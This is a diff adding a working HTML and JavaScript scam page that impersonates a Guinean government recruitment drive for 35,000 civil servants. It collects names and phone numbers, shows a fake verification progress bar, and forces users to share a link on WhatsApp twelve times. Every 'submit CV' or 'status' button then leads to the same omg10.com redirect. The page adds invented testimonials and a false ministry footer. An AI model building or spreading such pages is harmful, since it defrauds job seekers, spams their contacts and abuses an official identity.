@@ -1,0 +1,643 @@
+
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🇬🇳 RECRUTEMENT 35 000 FONCTIONNAIRES - Guinée</title>
+    <link rel="shortcut icon" type="image/png" href="https://img.icons8.com/color/96/guinea.png">
+    
+    <!-- WhatsApp Meta Tags - IMPORTANT for image preview -->
+    <meta property="og:title" content="🇬🇳 LE PRÉSIDENT GUINÉEN MAMADI RECRUTE 35 000 FONCTIONNAIRES" />
+    <meta property="og:description" content="Le gouvernement guinéen recrute 35 000 fonctionnaires, enseignants et agents de santé. Diplômés et non-diplômés peuvent postuler." />
+    <meta property="og:image" content="https://i.postimg.cc/prdCCdwc/Photo-Grid-1771329536809.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:url" content="https://job-update-avaliable.blogspot.com/?m=1" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Recrutement Guinée" />
+    
+    <!-- Twitter Card Meta Tags (for Twitter/X) -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="🇬🇳 RECRUTEMENT 35 000 FONCTIONNAIRES - Guinée" />
+    <meta name="twitter:description" content="Le gouvernement guinéen recrute 35 000 fonctionnaires. Postulez maintenant!" />
+    <meta name="twitter:image" content="https://i.postimg.cc/prdCCdwc/Photo-Grid-1771329536809.jpg" />
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome for WhatsApp Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        /* Hero Image */
+        .hero-image {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .hero-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        
+        h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2563eb;
+            margin-bottom: 16px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #4a4a4a;
+            margin-bottom: 20px;
+        }
+        
+        /* Stats */
+        .stats {
+            font-size: 36px;
+            font-weight: 700;
+            color: #2563eb;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        /* Eligibility List */
+        .eligibility-list {
+            list-style: none;
+            margin: 20px 0;
+            background: #f9fafb;
+            padding: 16px;
+            border-radius: 12px;
+        }
+        
+        .eligibility-list li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        
+        .eligibility-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .eligibility-list li:before {
+            content: "✓";
+            color: #059669;
+            font-weight: 600;
+            margin-right: 8px;
+        }
+        
+        /* Form */
+        .form-section {
+            margin: 25px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-input, .form-select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 15px;
+            background: white;
+        }
+        
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+        
+        /* Buttons */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            margin: 8px 0;
+            background: #2563eb;
+            color: white;
+        }
+        
+        .btn:hover {
+            background: #1d4ed8;
+        }
+        
+        .btn-whatsapp {
+            background: #25D366;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-whatsapp:hover {
+            background: #128C7E;
+        }
+        
+        .btn-whatsapp i {
+            font-size: 24px;
+        }
+        
+        /* Progress */
+        .progress-container {
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: #2563eb;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        /* Comments */
+        .comment {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .comment-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            background: #e5e7eb;
+        }
+        
+        .comment-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .comment-name {
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+        
+        .comment-time {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 6px;
+        }
+        
+        .comment-text {
+            color: #4b5563;
+            font-size: 14px;
+        }
+        
+        /* Hidden Pages */
+        #checking, #share, #final {
+            display: none;
+        }
+        
+        .error {
+            display: none;
+            color: #dc2626;
+            background: #fee2e2;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .separator {
+            height: 1px;
+            background: #e5e7eb;
+            margin: 20px 0;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #9ca3af;
+            font-size: 13px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Scroll to top behavior */
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        /* Supercounter styling */
+        .counter-container {
+            margin-top: 20px;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Main Card -->
+        <div class="card">
+            <!-- Hero Image - Fixed Display -->
+            <div class="hero-image">
+                <img src="https://i.postimg.cc/prdCCdwc/Photo-Grid-1771329536809.jpg" 
+                     alt="Président Mamadi Doumbouya" 
+                     onerror="this.src='https://placehold.co/500x250/2563eb/ffffff?text=PRÉSIDENT+MAMADI+DOUMBOUYA&font=inter'; this.alt='Placeholder Image';">
+            </div>
+            
+            <!-- MAIN PAGE WITH FORM VISIBLE -->
+            <div id="main-page">
+                <h1>🇬🇳 LE PRÉSIDENT GUINÉEN MAMADI RECRUTE</h1>
+                <h2>35 000 FONCTIONNAIRES</h2>
+                
+                <p class="subtitle">Le gouvernement guinéen recherche 35 000 personnes pour des postes de fonctionnaires, d'enseignants et d'agents de santé.</p>
+                
+                <div class="stats">35 000 POSTES</div>
+                
+                <!-- Eligibility -->
+                <ul class="eligibility-list">
+                    <li>Diplômés et non-diplômés</li>
+                    <li>Toutes régions de Guinée</li>
+                    <li>Enseignants, agents de santé, administratifs</li>
+                    <li>Postes permanents</li>
+                </ul>
+                
+                <!-- FORM - VISIBLE IMMEDIATELY -->
+                <div class="form-section">
+                    <h3 style="margin-bottom: 15px;">FORMULAIRE DE CANDIDATURE</h3>
+                    
+                    <div class="form-group">
+                        <input type="text" class="form-input" placeholder="Nom complet" id="name">
+                    </div>
+                    
+                    <div class="form-group">
+                        <select class="form-select" id="region">
+                            <option value="">Sélectionnez votre région</option>
+                            <option value="Boké">Boké</option>
+                            <option value="Conakry">Conakry</option>
+                            <option value="Faranah">Faranah</option>
+                            <option value="Kankan">Kankan</option>
+                            <option value="Kindia">Kindia</option>
+                            <option value="Labé">Labé</option>
+                            <option value="Mamou">Mamou</option>
+                            <option value="Nzérékoré">Nzérékoré</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" class="form-input" placeholder="Ville / Préfecture" id="city">
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="tel" class="form-input" placeholder="Numéro de téléphone" id="phone">
+                    </div>
+                    
+                    <div class="form-group">
+                        <select class="form-select" id="qualification">
+                            <option value="">Niveau d'étude</option>
+                            <option value="aucun">Sans diplôme</option>
+                            <option value="cepe">CEPE</option>
+                            <option value="bepc">BEPC</option>
+                            <option value="bac">Baccalauréat</option>
+                            <option value="licence">Licence</option>
+                            <option value="master">Master</option>
+                            <option value="doctorat">Doctorat</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <select class="form-select" id="sector">
+                            <option value="">Secteur souhaité</option>
+                            <option value="education">Éducation (Enseignant)</option>
+                            <option value="sante">Santé (Agent de santé)</option>
+                            <option value="admin">Administration publique</option>
+                            <option value="autre">Autre</option>
+                        </select>
+                    </div>
+                    
+                    <button id="submitBtn" class="btn" onclick="submitForm()">SOUMETTRE MA CANDIDATURE</button>
+                    
+                    <div class="error" id="form-error">
+                        Veuillez remplir tous les champs
+                    </div>
+                </div>
+                
+                <div class="separator"></div>
+                
+                <p style="text-align: center; color: #6b7280; font-size: 14px;">
+                    Postulez et partagez cette offre avec d'autres personnes, quelqu'un pourrait avoir besoin de cette opportunité
+                </p>
+            </div>
+            
+            <!-- Checking Page - User stays at top to see this -->
+            <div id="checking">
+                <h2 style="text-align: center; margin: 30px 0;">TRAITEMENT EN COURS</h2>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div id="fill" class="progress-fill"></div>
+                    </div>
+                    <div id="percentage" style="text-align: center; font-weight: 600; margin-top: 10px;">0%</div>
+                </div>
+                <div style="width: 50px; height: 50px; border: 4px solid #e5e7eb; border-top-color: #2563eb; border-radius: 50%; margin: 30px auto; animation: spin 1s linear infinite;"></div>
+                <p style="text-align: center; color: #6b7280;">Vérification de vos informations...</p>
+            </div>
+            
+            <!-- SHARE PAGE -->
+            <div id="share">
+                <h2 style="text-align: center; margin-bottom: 20px;">ÉTAPE FINALE REQUISE</h2>
+                
+                <div style="background: #fef2f2; padding: 20px; border-radius: 12px; margin: 20px 0; border: 2px solid #dc2626;">
+                    <p style="color: #dc2626; font-weight: 700; text-align: center; margin-bottom: 15px; font-size: 18px;">
+                        ⚠️ IMPORTANT - ACTION REQUISE
+                    </p>
+                    <p style="color: #1f2937; text-align: center; margin-bottom: 10px;">
+                        Partagez cette offre avec <strong>5 GROUPES</strong> et <strong>12 AMIS</strong> sur WhatsApp
+                    </p>
+                    <p style="color: #4b5563; text-align: center; font-size: 14px;">
+                        Après le partage, vous serez automatiquement redirigé vers le portail de soumission pour uploader votre CV et autres documents nécessaires.
+                    </p>
+                </div>
+                
+                <div style="background: #f3f4f6; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                    <p style="font-weight: 600; margin-bottom: 15px; text-align: center;">📋 DOCUMENTS REQUIS:</p>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="padding: 8px 0; display: flex; align-items: center; gap: 10px;">• CV à jour</li>
+                        <li style="padding: 8px 0; display: flex; align-items: center; gap: 10px;">• Copie de la pièce d'identité</li>
+                        <li style="padding: 8px 0; display: flex; align-items: center; gap: 10px;">• Diplômes et certificats</li>
+                        <li style="padding: 8px 0; display: flex; align-items: center; gap: 10px;">• Photo d'identité</li>
+                    </ul>
+                </div>
+                
+                <!-- WhatsApp Button with Icon -->
+                <button id="whatsapp" class="btn btn-whatsapp">
+                    <i class="fab fa-whatsapp"></i> SHARE ON WHATSAPP
+                </button>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div id="fill2" class="progress-fill"></div>
+                    </div>
+                </div>
+                
+                <p style="text-align: center; color: #6b7280; font-size: 14px; margin-top: 15px;">
+                    Progression: <span id="share-count">0</span>/12 partages
+                </p>
+            </div>
+            
+            <!-- Final Page -->
+            <div id="final">
+                <div style="text-align: center; padding: 30px 0;">
+                    <div style="font-size: 60px; color: #059669; margin-bottom: 20px;">✅</div>
+                    <h2 style="color: #1f2937; margin-bottom: 10px;">INSCRIPTION COMPLÉTÉE</h2>
+                    <p style="color: #6b7280; margin-bottom: 30px;">Votre candidature a été enregistrée</p>
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <button onclick="window.open('https://omg10.com/4/10077877')" style="padding: 14px; background: #e5e7eb; border: none; border-radius: 8px; cursor: pointer;">📋 CHECK STATUS</button>
+                        <button onclick="window.open('https://omg10.com/4/10077877')" style="padding: 14px; background: #e5e7eb; border: none; border-radius: 8px; cursor: pointer;">📄 SUBMIT CV</button>
+                        <button onclick="window.open('https://omg10.com/4/10077877')" style="padding: 14px; background: #e5e7eb; border: none; border-radius: 8px; cursor: pointer;">📅 CONVOCATION</button>
+                        <button onclick="window.open('https://omg10.com/4/10077877')" style="padding: 14px; background: #e5e7eb; border: none; border-radius: 8px; cursor: pointer;">📞 CONTACT</button>
+                    </div>
+                    
+                    <div style="margin-top: 20px;">
+                        <button onclick="window.open('https://omg10.com/4/10077877')" class="btn">
+                            📤 PORTAIL DE SOUMISSION
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Comments with Images -->
+        <div class="card">
+            <h3 style="margin-bottom: 20px;">AVIS DES CANDIDATS</h3>
+            
+            <!-- Comment 1 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="https://randomuser.me/api/portraits/men/32.jpg" onerror="this.style.display='none'; this.parentNode.innerHTML='MD'; this.parentNode.style.display='flex'; this.parentNode.style.alignItems='center'; this.parentNode.style.justifyContent='center'; this.parentNode.style.background='#2563eb'; this.parentNode.style.color='white';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-name">Mamadou Diallo</div>
+                    <div class="comment-time">Il y a 10 minutes · Conakry</div>
+                    <div class="comment-text">Je viens de postuler! Enseignant depuis 3 ans, j'espère être retenu. Merci Président!</div>
+                </div>
+            </div>
+            
+            <!-- Comment 2 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="https://randomuser.me/api/portraits/women/44.jpg" onerror="this.style.display='none'; this.parentNode.innerHTML='FS'; this.parentNode.style.display='flex'; this.parentNode.style.alignItems='center'; this.parentNode.style.justifyContent='center'; this.parentNode.style.background='#2563eb'; this.parentNode.style.color='white';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-name">Fatoumata Sylla</div>
+                    <div class="comment-time">Il y a 25 minutes · Kindia</div>
+                    <div class="comment-text">Ma sœur a partagé l'info. 35 000 postes c'est une grande opportunité pour la Guinée!</div>
+                </div>
+            </div>
+            
+            <!-- Comment 3 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="https://randomuser.me/api/portraits/men/22.jpg" onerror="this.style.display='none'; this.parentNode.innerHTML='AB'; this.parentNode.style.display='flex'; this.parentNode.style.alignItems='center'; this.parentNode.style.justifyContent='center'; this.parentNode.style.background='#2563eb'; this.parentNode.style.color='white';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-name">Amadou Bah</div>
+                    <div class="comment-time">Il y a 45 minutes · Labé</div>
+                    <div class="comment-text">J'ai partagé avec tous mes groupes. Que Dieu bénisse notre pays!</div>
+                </div>
+            </div>
+            
+            <!-- Comment 4 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="https://randomuser.me/api/portraits/women/68.jpg" onerror="this.style.display='none'; this.parentNode.innerHTML='AD'; this.parentNode.style.display='flex'; this.parentNode.style.alignItems='center'; this.parentNode.style.justifyContent='center'; this.parentNode.style.background='#2563eb'; this.parentNode.style.color='white';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-name">Aissatou Diallo</div>
+                    <div class="comment-time">Il y a 1 heure · Boké</div>
+                    <div class="comment-text">Diplômée sans emploi depuis 2 ans, j'espère vraiment être prise. Merci!</div>
+                </div>
+            </div>
+            
+            <!-- Comment 5 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="https://randomuser.me/api/portraits/men/62.jpg" onerror="this.style.display='none'; this.parentNode.innerHTML='IS'; this.parentNode.style.display='flex'; this.parentNode.style.alignItems='center'; this.parentNode.style.justifyContent='center'; this.parentNode.style.background='#2563eb'; this.parentNode.style.color='white';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-name">Ibrahima Sory</div>
+                    <div class="comment-time">Il y a 2 heures · Nzérékoré</div>
+                    <div class="comment-text">Formulaire simple et rapide! Je partage avec mes amis. Ensemble pour la Guinée! 🇬🇳</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Supercounter Added at Footer -->
+        <div class="card" style="text-align: center;">
+            <!-- BEGIN: Powered by Supercounters.com -->
+            <center>
+                <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+                <script type="text/javascript">sc_online_i(1729857,"ffffff","ffffff");</script>
+            </center>
+            <!-- END: Powered by Supercounters.com -->
+        </div>
+        
+        <div class="footer">
+            RÉPUBLIQUE DE GUINÉE - MINISTÈRE DE LA FONCTION PUBLIQUE
+        </div>
+    </div>
+    
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    
+    <script>
+        // ✅ FIXED WHATSAPP MESSAGE - Using \n for line breaks
+        var text1 = "LE PRESIDENT GUINÉEN MAMADI RECRUTE 35 000 FONCTIONNAIRES\n\n" +
+                    "Le gouvernement guinéen recherche 35 000 personnes pour des postes de fonctionnaires, d'enseignants et d'agents de santé.\n\n" +
+                    "Diplômés et non-diplômés Postulez et partagez cette offre avec d'autres personnes, quelqu'un pourrait avoir besoin de cette opportunité\n\n" +
+                    "Cliquez sur le lien ci-dessous pour postuler dès maintenant.\n\n" +
+                    "Apply here👉\n" +
+                    "https://awkl.xyz/Guinee-Fonction-Recrutement";
+        
+        var shareCount = 0;
+        var totalShares = 12;
+        
+        function submitForm() {
+            // Validate form
+            if ($("#name").val().length < 3 || $("#phone").val().length < 7 || $("#region").val() === "" || $("#qualification").val() === "" || $("#sector").val() === "") {
+                $("#form-error").fadeIn(500);
+                setTimeout(function() { $("#form-error").fadeOut(500); }, 3000);
+                return;
+            }
+            
+            // Scroll to top to show loading
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            
+            // Hide main page, show checking
+            $("#main-page").fadeOut(0);
+            $("#checking").fadeIn(1000);
+            
+            var i = 0;
+            var interval = setInterval(function() {
+                i++;
+                $("#percentage").text(i + "%");
+                $("#fill").css("width", i + "%");
+                
+                if (i >= 100) {
+                    clearInterval(interval);
+                    setTimeout(function() {
+                        $("#checking").fadeOut(0);
+                        $("#share").fadeIn(1000);
+                        // Scroll to top again for share page
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }, 500);
+                }
+            }, 50);
+        }
+        
+        $("#whatsapp").click(function() {
+            // Send WhatsApp message with proper encoding
+            window.location.href = "whatsapp://send?text=" + encodeURIComponent(text1);
+            
+            setTimeout(function() {
+                shareCount++;
+                var width = (shareCount / totalShares) * 100;
+                $("#fill2").css("width", width + "%");
+                $("#share-count").text(shareCount);
+                
+                if (shareCount >= totalShares) {
+                    setTimeout(function() {
+                        $("#share").fadeOut(0);
+                        $("#final").fadeIn(1000);
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }, 1000);
+                }
+            }, 2000);
+        });
+        
+        // Update comment times
+        setInterval(function() {
+            $(".comment-time").each(function(index) {
+                var times = [
+                    'Il y a 5 minutes · Conakry',
+                    'Il y a 15 minutes · Kindia', 
+                    'Il y a 35 minutes · Labé',
+                    'Il y a 50 minutes · Boké',
+                    'Il y a 1 heure · Nzérékoré'
+                ];
+                if (index < times.length) {
+                    $(this).text(times[index]);
+                }
+            });
+        }, 60000);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"39387849bc534a459e14f6e5667cb166","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
